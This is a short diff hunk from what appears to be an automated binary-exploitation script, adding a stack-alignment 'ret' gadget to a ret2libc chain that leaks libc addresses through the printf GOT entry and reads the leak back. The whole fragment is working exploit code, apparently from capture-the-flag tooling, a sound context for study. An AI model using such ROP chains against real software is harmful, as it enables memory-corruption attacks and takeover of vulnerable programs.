@@ -265,7 +265,7 @@ def ret2libc_64(fl_name,base_addr):
                 puts_leak = p64(e.got['puts']) + p64(e.plt['puts']) + p64(e.symbols['main'])
                 libc_leaker = offset_pusher + puts_leak
             else:
-                printf_leak = p64(e.got['printf']) + p64(e.plt['printf']) + p64(e.symbols['main'])
+                printf_leak = p64(ret) + p64(e.got['printf']) + p64(e.plt['printf']) + p64(e.symbols['main'])
                 libc_leaker = offset_pusher + printf_leak
             r.sendline(libc_leaker)
             a = r.recvuntil(b'\x7f')
